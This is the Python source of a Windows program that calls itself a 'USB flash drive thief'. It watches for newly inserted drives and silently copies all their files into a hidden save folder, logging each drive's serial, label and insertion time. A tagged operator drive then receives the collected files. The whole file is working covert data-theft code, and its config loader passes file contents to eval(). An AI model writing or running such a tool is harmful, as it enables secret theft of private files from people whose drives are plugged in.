# -- coding: utf-8 --


import os
import re
import time
import shutil
import threading
import traceback
import logs as L
#import win32file


print("""
U盘小偷V1.0.0-alpha1.5
      
作者     : Spruce_leaves_
源代码   : https://github.com/Spruce-Leaves/USBFlashDriveThief

免责声明 : 严禁将此程序及其内容用于任何商业或非法用途。对于因违反此规定而产生的任何法律后果，用户需自行承担全部责任。
--------------------------

output:
""")


class main():
    def __init__(self):
        self.initialize()
    


    def initialize(self):
        data = self.getConfig("UPanThief.json")
        self.OPTagName = data[0]
        self.noCopyTagName = data[1]
        self.savePath = data[2]
        self.OPCopyPath = data[3]

        self.devGroupObj = DeviceGroup()

        self.devGroupObj.initUpdate()
        self.devGroupObj.update()
        l.log("初始设备: {}\n".format(self.reRawDevList(self.devGroupObj.devList)))

    
        self.detectDevice()


    def detectDevice(self):
        while True:

            newDevList, popDevList, newErrDevList, popErrDevList = self.searchDevice(self.devGroupObj)
            self.popDevList = self.reRawDevList(popDevList)


            if popDevList:
                l.log(f"设备弹出: {self.reRawDevList(popDevList)}", True)

            if newErrDevList:
                l.log(f"异常设备接入: {self.reRawDevList(newErrDevList)}", True)
            
            if popErrDevList:
                l.log(f"异常设备弹出: {self.reRawDevList(popErrDevList)}", True)

            if newDevList:
                l.log(f"设备接入: {self.reRawDevList(newDevList)}", True)

                #l.outputBufferLogs("         ")

                newList = self.reRawDevList(newDevList)   #将设备对象列表转回设备元组列表

                self.copyDeviceFile(newList)


                print()   #\n

            else:
                pass

            l.clearBuffer()
            
            time.sleep(0.5)


    def reRawDevList(self, devList:list):
        return [[dev.sn, dev.volumeName, dev.letter] for dev in devList]


    def getConfig(self, name) -> tuple[str, str, str, str]:
        #name = "UPanThief.json"

        if name not in os.listdir():   #如果工作目录下没有配置文件
            with open(file = name, mode = "w+", encoding = "utf8") as fo:   #就创建配置文件并填充格式
                fo.write("""{\n    "OPTagFileName" : "",\n    "noCopyTagFileName" : "",\n    "savePath" : "",\n    "OPCopyPath" : ""\n}""")
                print("NO file")

            return ("", "", "", "")
        
        else:   #如果工作目录下有配置文件
            with open(file = name, mode = "r", encoding = "utf8") as fo:   #就开始读取


                def dirDispose(rawData: str) -> str:
                    for fh in ["\\", "/"]:
                        rawData:list[str] = rawData.split(fh)

                        i = 0
                        while True:
                            strObj = rawData[i]

                            if  strObj == "" or strObj.isspace():   #如果字符串为空或只有空格
                                rawData.pop(i)                          #就去掉
                            else:
                                i += 1
                            if i >= len(rawData):
                                break

                        rawData = "/".join(rawData)
                    
                    return rawData


                def formatEnv(strObj: str, envDict: dict) -> str:
                    strList = re.split("({\w+})", strObj)

                    for index_ in range(len(strList)):
                        subStr = strList[index_]
                        if subStr == "" or subStr.isspace() or len(subStr) <= 2:   #如果该字符串为空 或 只有空格 或 长度小于2
                            continue

                        elif (subStr[0] == "{" and subStr[-1] == "}") and\
                                                                        \
                            (subStr[1: -1] in envDict.keys()):   #如果该字符串符合环境变量的格式 且 对应的环境变量 在 环境变量列表 内

                            strList[index_] = "/".join(envDict[subStr[1: -1]].split("\\"))            #就替换为对应的环境变量的值


                    strObj2 = "".join(strList)


                    return strObj2



                envDict = {"WINDIR": os.getenv("WINDIR"), 
                        "APPDATA": os.getenv("APPDATA"), 
                        "USERPROFILE": os.getenv("USERPROFILE"), 
                        "SYSTEMDRIVE": os.getenv("SYSTEMDRIVE"), 
                        "COMPUTERNAME": os.getenv("COMPUTERNAME")}
                    

                data = dirDispose(fo.read())
                data = formatEnv(data, envDict)
                data = "".join(data.split("\n"))
                data = eval(data)
                    

            OPTagName = data["OPTagFileName"]
            noCopyTagName = data["noCopyTagFileName"]
            savePath = data["savePath"]
            OPCopyPath = data["OPCopyPath"]

            return (OPTagName, noCopyTagName, savePath, OPCopyPath)

    


    def copyDeviceFile(self, newDeviceList:list):
        def dirMake(pathStr: str):
            exists = os.path.exists

            if "\\" in pathStr:
                pathStr = "/".join(pathStr.split("\\"))
            else:
                pass

            for j in range(1, len(pathStr.split("/")) + 1):   #就递归(迫真)创建文件夹
                path = "/".join(pathStr.split("/")[0:j])
                L.logs.log(f"path: {path}")
                if exists(path) ==False:
                    os.mkdir(path)
                else:
                    pass


        threadList = []
        for l in newDeviceList:   #这里加个判断路径是否完整存在, 不完整存在就循环make
            newDir = pJoin(self.savePath, l[0])
            exist = os.path.exists(newDir)
            if exist == False:
                dirMake(newDir)

            self.saveInfo(l)
            copyObj = self.copyClass(self, l)
            threadList.append(copyObj)
            copyObj.start()

    def saveInfo(self, device:tuple[str, str, str]):
        infoFileName = "info.txt"
        
        deviceDir = pJoin(self.savePath, device[0])
        infoPath = pJoin(deviceDir, infoFileName)
        exist = os.path.exists(pJoin(infoPath, infoFileName))

        with open(file = infoPath, mode = "a", encoding = "utf8") as fo:
            if exist == False:
                fo.write("分区接入记录:\n")
            
            timeStr = time.strftime("%Y_%m_%d_%H_%M_%S")
            fo.write(f"""        时间: {timeStr}  卷标: {device[1]}  盘符: {device[2]}\n""")



    def searchDevice(self, groupObj:object):
        groupObj.update()

        devList = groupObj.devList
        newSnList = groupObj.listSn(mode = DeviceGroup.normal, status = [Device.new])
        newList = [groupObj.search(sn) for sn in newSnList]

        popSnList = groupObj.listSn(mode = DeviceGroup.normal, status = [Device.pop])
        popList = [groupObj.search(sn) for sn in popSnList]

        newErrSnList = groupObj.listSn(mode = DeviceGroup.error, status = [Device.new])
        newErrList = [groupObj.search(sn) for sn in newErrSnList]

        popErrSnList = groupObj.listSn(mode = DeviceGroup.error, status = [Device.pop])
        popErrList = [groupObj.search(sn) for sn in popErrSnList]


        return [newList, popList, newErrList, popErrList]



    class copyClass(threading.Thread):
        def __init__(self, invokeClass:object, deviceTuple:tuple[str, str, str]):
            super().__init__()                           #(分区sn码, 分区卷标, 分区盘符)
            self.deviceTuple = deviceTuple
            self.invokeClass = invokeClass
            self.copyState   = True
            l.log(f"已创建线程    : {deviceTuple}")
        


        def run(self):
            l.log(f"线程已开始运行: {self.deviceTuple}")

            protection = False
            excludeList = ["VTOYEFI"]

            
            pathExists = os.path.exists(self.deviceTuple[2])   #判断盘符是否存在

            if pathExists == False:
                print(f"路径不存在   : {self.deviceTuple[2]}")
                print(f"复制终止     : {self.deviceTuple}")
            
            elif self.deviceTuple[0] in excludeList or self.deviceTuple[1] in excludeList:   #通过sn码和卷标排除分区
                l.log(f"排除的分区   : {self.deviceTuple}")
                l.log(f"复制终止     : {self.deviceTuple}")
                
            else:
                dirList = os.listdir(self.deviceTuple[2])

                if self.invokeClass.OPTagName in dirList:   #如果有管理员标记文件
                    l.log(f"管理员U盘    : {self.deviceTuple}")
                    dirList = os.listdir(self.invokeClass.savePath)

                    for fileName in dirList:

                        self.copy(self.invokeClass.savePath, fileName, os.path.join(self.deviceTuple[2], self.invokeClass.OPCopyPath))


                elif self.invokeClass.noCopyTagName in dirList:   #如果没有管理员标记且有"不复制"标记
                    l.log(f"受保护的U盘   : {self.deviceTuple}")
                    protection = True                                 #就不复制


                else:   #如果没有标记文件
                            #就开偷(

                    if os.path.exists(pJoin(self.invokeClass.savePath, self.deviceTuple[0])) == False:   #如果保存路径下没有该U盘的分类文件夹
                        os.mkdir(pJoin(self.invokeClass.savePath, self.deviceTuple[0]))                      #就创建该文件夹
                    else:
                        pass

                    for fileName in dirList:

                        self.copy(self.deviceTuple[2], fileName, pJoin(self.invokeClass.savePath, self.deviceTuple[0]))


                if protection:   #如果是受保护的U盘
                    pass             #就什么都不干

                else:
                    if self.copyState:
                        copyState = "完成"
                    else:
                        copyState = "中断"
                    l.log(f"复制{copyState}: {self.deviceTuple}", True)
                    self.invokeClass.copyState = True


            l.log(f"线程已结束运行: {self.deviceTuple}")



        def copy(self,filePath:str, fileName, newFilePath:str):   #复制方法

            fileFullPath = pJoin(filePath, fileName)

            if os.access(fileFullPath, os.R_OK) == False:
                l.log(f"无法访问: {fileFullPath}")

            else:

                try:
                    pathExists = os.path.exists(self.deviceTuple[2])
                    if pathExists == False:
                        l.log(f"路径不存在: {self.deviceTuple[2]}", True)
                    else:
                        l.log(f"正在复制: {fileName}  {self.deviceTuple}", True)


                        newFullPath = pJoin(newFilePath, fileName)

                        exist = fileName in os.listdir(newFilePath)   #如果目标路径中有同名文件, 该变量就为True
                        isDir = os.path.isdir(fileFullPath)   #如果要被复制的是文件夹, 该变量就为True



                        if exist == False and isDir == False:   #如果不是文件夹且目标文件夹内没有重名文件
                            shutil.copy(fileFullPath, newFilePath)   #就直接复制文件

                        elif exist == False and isDir == True:   #如果是文件夹且目标文件夹内没有重名文件夹
                            shutil.copytree(fileFullPath, newFullPath)   #就直接复制文件夹

                        elif exist == True and isDir == False:   #如果不是文件夹且目标路径中存在同名文件
                                l.log("         " + "已 存 在")                           #就不复制
                        
                        elif exist == True and isDir == True:   #如果是文件夹且目标文件夹下有重名
                            fileList = os.listdir(fileFullPath)   #获取源文件夹内的文件或文件夹
                            for i in fileList:   #遍历文件夹内部
                                self.copy(fileFullPath, i, os.path.join(newFilePath, fileName))   #把列表内的文件或文件夹一个一个一个交给当前方法(copy)从头处理(喜)
                        

                except (FileNotFoundError, shutil.Error, OSError) as err:
                    traceback.print_exc()
                    self.operate()



        def operate(self):
            time.sleep(0.1)
            self.copyState = False
            if self.invokeClass.popDevList:
                l.log(f"USB存储设备弹出: {self.invokeClass.popDevList}", True)
                #self.invokeClass.popDevList = []   #不知到我以前写这行用来干吗的

            else:
                l.log("Error: 路径不存在", True)

            """ if isDir == False:
                os.remove(newFullPath)
                l.log("文件复制中断, 已删除") """




class DeviceGroup():

    normal, error = 0, 1   #mode


    def __init__(self):
        self.devList:list[Device] = []


    def addDevice(self, deviceObj):
        self.devList.append(deviceObj)


    def delDevice(self, dev:object|int):
        if type(dev) == Device:   #传入设备实例
            self.devList.remove(dev)
        elif type(dev) == int:    #传入设备sn
            self.devList.remove(self.search(dev))
        else:
            raise ValueError(f"错误的值: {dev}")


    def listSn(self, mode:int, status:list[int]):
        snList = []

        if mode == DeviceGroup.normal:

            for dev in self.devList:
                if dev.status in status and dev.errorStatus == Device.normal:
                    snList.append(dev.sn)
        
        elif mode == DeviceGroup.error:

            for dev in self.devList:
                if dev.errorStatus in status:
                    snList.append(dev.sn)
        
            
        return snList
    

    def search(self, sn:int|str):

        for devObj in self.devList:
            if devObj.sn == sn:
                return devObj
            
        else:
            return None
        

    def strInt16(self, inStr:str):   #判断一个字符串是否可以转成16进制整形
        int16Str = [str(i) for i in range(0, 10)] + ["A", "B", "C", "D", "E", "F"]
        for s in inStr:
            if s in int16Str:
                pass
            else:
                return False
        else:
            return True
        

    def update(self):
        self._update(self.getDeviceInfo())

    def initUpdate(self):
        self.devList = [Device(dev[0], dev[1], dev[2]) for dev in self.getDeviceInfo()]


    def _update(self, rawDevList:list[tuple[int, str, str]]):

        oldSnList = self.listSn(mode = DeviceGroup.normal, status = Device.all)   #上一次的snList
        oldErrSnList = self.listSn(mode = DeviceGroup.error, status = Device.all)   #上一次的errSnList
        snList = [devTuple[0] for devTuple in rawDevList]
        newSnList = list(set(snList) - set(oldSnList[:] + oldErrSnList[:]))
        popSnList = list(set(oldSnList[:] + oldErrSnList[:]) - set(snList))


        for sn in list(set(oldSnList + oldErrSnList)):
            devObj = self.search(sn)
            if devObj.status == Device.pop:   #如果已被弹出
                self.delDevice(devObj)           #就从设备列表里删除

            elif devObj.sn in popSnList:   #如果被弹出
                devObj.setStatus(Device.pop)  #就将其设备对象状态设置为"弹出"
                if devObj.errorStatus != Device.normal:
                    devObj.setErrorStatus(Device.pop)


        for sn in snList:
            devObj = self.search(sn)

            if self.strInt16(sn) == True:

                if sn in oldSnList and devObj.status == Device.new:   #如果已存在
                    devObj.setStatus(Device.old)   #就更新状态


                elif sn in newSnList:   #如果是新的
                    for devTuple in rawDevList:   #就添加
                        if sn == devTuple[0]:
                            newDevObj = Device(sn, devTuple[1], devTuple[2])
                            self.addDevice(newDevObj)

                elif devObj.status == Device.old:   #如果是旧的
                    pass


                else:
                    raise Exception("意料外的条件分支")        

                

            elif self.strInt16(sn) == False:   #如果是异常设备

                if sn in oldErrSnList:   #如果已存在
                    if devObj.status == Device.new:
                        devObj.setStatus(Device.old)
                    if devObj.errorStatus == Device.new:
                        devObj.setErrorStatus(Device.old)


                elif sn not in oldErrSnList:   #如果是新的
                    for devTuple in rawDevList:   #就添加
                        if sn == devTuple[0]:
                            newDevObj = Device(sn, devTuple[1], devTuple[2])
                            self.addDevice(newDevObj)



 

    def getDeviceInfo(self):
        """返回值: list[ tuple (分区sn码, 分区卷标, 分区盘符) ]"""

        data = os.popen("wmic logicaldisk get VolumeSerialNumber, VolumeName, Name").read()

        data = data.split("\n\n\n\n")[0]
        data = data.split("\n\n")[1:]

        deviceList = []

        for device in data:
            device = device.rstrip(" ")

            letter     = device[:2] + "\\"
            sn         = device[-8:]
            volumeName = device[2:-8].strip(" ")

            deviceList.append((sn, volumeName, letter))


        return deviceList




class Device():
    new, old, pop, normal, all = 0, 1, 2, 3, list(range(0, 3))   #设备状态

    def __init__(self, sn, volumeName, letter):
        if sn == letter[:2]:
            self.errorStatus = Device.new
        else:
            self.errorStatus = Device.normal

        self.sn = sn
        self.letter = letter
        self.volumeName = volumeName
        self.status = Device.new


    def setStatus(self, status):
        if status in [0, 1, 2]:
            self.status = status
        else:
            raise ValueError(f"错误的状态: {status}")
        

    def setErrorStatus(self, status):
        if status in [0, 1, 2, 3]:
            self.errorStatus = status
        else:
            raise ValueError(f"错误的状态: {status}")




if __name__ == "__main__":

    l = L.logs()
    pJoin = os.path.join   #path Join
    pSJoin = "/".join      #pathStr Join


    try:
        Main = main()

    except Exception as err:   #如果屎山炸了
        with open(file = "log_{}.txt".format(time.strftime("%Y_%m_%d_%H_%M_%S")), mode = "w+", encoding = "utf8") as fo:   #就把所有变量和报错信息写入日志文件
            
            allVariable = globals()   #获取所有变量
            allVariableKeyList = list(allVariable.keys())
            for i in allVariableKeyList:
                if i == "allVariableKeyList":
                     # i == "allVariable" or
                    pass
                else:
                    fo.write("{}: {}\n".format(i, allVariable[i]))

            fo.write("\n")
            fo.writelines(traceback.format_exc())
        raise err


